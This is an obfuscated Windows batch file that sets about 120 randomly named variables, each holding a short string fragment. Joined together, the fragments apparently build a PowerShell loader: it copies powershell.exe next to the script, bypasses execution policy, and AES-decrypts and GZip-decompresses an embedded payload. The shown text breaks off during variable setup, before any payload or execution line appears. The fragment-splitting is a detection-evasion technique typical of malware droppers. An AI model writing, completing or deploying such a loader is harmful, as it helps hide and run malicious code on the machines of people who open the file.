@echo off
set "NraZkLtHoo=rS"
set "nAnQAwUlID=ll"
set "RhZLqRsyaG=po"
set "JtZBTspxWI=Po"
set "njABpSIxra=he"
set "lEAcBDYjzm=do"
set "UpKpAgSNXK=py"
set "odlLnsNdpL=ow"
set "MwhlYWgsdb=we"
set "TphJSeRfIK=Sy"
set "QNyQYREZij=he"
set "dQnwspegLr=xe"
set "gjyplODqQb=st"
set "iDloPYWBTj=32"
set "NQoOshmAuH=in"
set "BHuEFLBzmd=\W"
set "yEIajGsFYB=we"
set "YUoXVZlrUz= /"
set "UylXqojxyA=.e"
set "ZHiHSYXrng=1."
set "MMdGpkSmEG=em"
set "wQkYtXDgNZ=co"
set "GyrGHMyjKh=ll"
set "kHKwXpHatJ=nd"
set "LBCGZOkSZz=:\"
set "XYvZQrsaqh=\v"
set "VZOxSqgePe=s\"
set "rEQdIPYDlb=y "
set "SObdtzQtsl=Wi"
set "ehijEKJzVc= C"
set "rhkTOmdjzO=0\"
set "yCYBmQOBlD=rs"
set "SbxGzerybD=ws"
set "PbhjsCpgWH= %~dp0"
set "wOKvdLmWCL=cd"
set "JsZCpesyon=hjKI"
set "CiQNbbrTGd=t Sy"
set "ZQawURyOLE=($eZ"
set "ogPyHtPZBV=OAJT"
set "edzYZjmQFk=ode]"
set "tYtoVuDhwq=Secu"
set "AFfInMtoUT=Jgug"
set "azDqgEGNSW=tem."
set "sZPeqPDWjw=yste"
set "cOVbjoPifT=raph"
set "gxBeIRTOWQ=tS46"
set "mtpMwrYERS=Secu"
set "LWHedwxeOm= [Sy"
set "aOeWugNEeZ=esaB"
set "skpRgAbrrM=Obje"
set "oMELbCUOjw=vj0m"
set "YerYvKFpaR=yt.I"
set "yVxMjLPDcM=$tbI"
set "gUWZTGyrLK=form"
set "PKbReaGvSg=);$c"
set "xFThJRvFjh=yste"
set "KOeUEzUYPq=UGTu"
set "wGnYuHnSgu='[-1"
set "BWEAJEfDwd=ateD"
set "OwhiREPUWp=ypto"
set "AaogwOexNm=tmf."
set "TyXZYpQdxo=m(, "
set "vFiwnKBpcM=3); "
set "AxzxHaPRBc=bypa"
set "zpyVPFQlCd=Disp"
set "wdKZQhuypI=..-1"
set "GefMNpcwhj=($eZ"
set "dejlvvnQBz=16] "
set "pvoJeEktcJ=Comp"
set "CSvAxvYRoW=$EuQ"
set "nNnTkqKzHj=('da"
set "ncykqZkuJY=in $"
set "nwwweYnuaN=ddin"
set "GpjeTWPhxg=ress"
set "OjsCqCphLF= = N"
set "TohWvjrTPY=k; }"
set "czIsYSGpsU=yste"
set "DAWrZWsPfV= if "
set "bFRyfnMZOt=le  "
set "xGnjJsuxdB=.-16"
set "idxhsLSneN=oArr"
set "kMhGFNKivw= '')"
set "WcflHmAMwF=ptog"
set "qQgmddEinh=;$cv"
set "amDiDfpTjx=comm"
set "QvMMOqHdVK=gMod"
set "SaTHQNZcPb=pose"
set "kliTbSoGuH=rity"
set "CTPcsTwdQt=New-"
set "GSjaDTczMA=hy.A"
set "xwzkqOePhu=am;$"
set "fhlXOfxLcq=pres"
set "adiMGbgnsm=.Mem"
set "XDAFnkYZFH=morF"
set "UaOjPUWdQy=esMa"
set "UqUEpwAjek= = ["
set "IFtskwvxQG=ispo"
set "XoEwDHuaIF=y.Pa"
set "avXlNXGlEG=.Len"
set "SOSaUgGffh=BC;$"
set "jvxLtrwayx=BJgu"
set "RmTWgugOSF=pDZz"
set "MfvUUXaYsD=Mode"
set "vLpvfOWTrn=);$Z"
set "LmkZBnWBYx=  $p"
set "omaRzPQxdx=3HWs"
set "MWZCRbGcwa=.Cry"
set "jgEbcjFaee=fore"
set "vLKaxDvFFS=[Env"
set "NLCfiAASAW=$hjK"
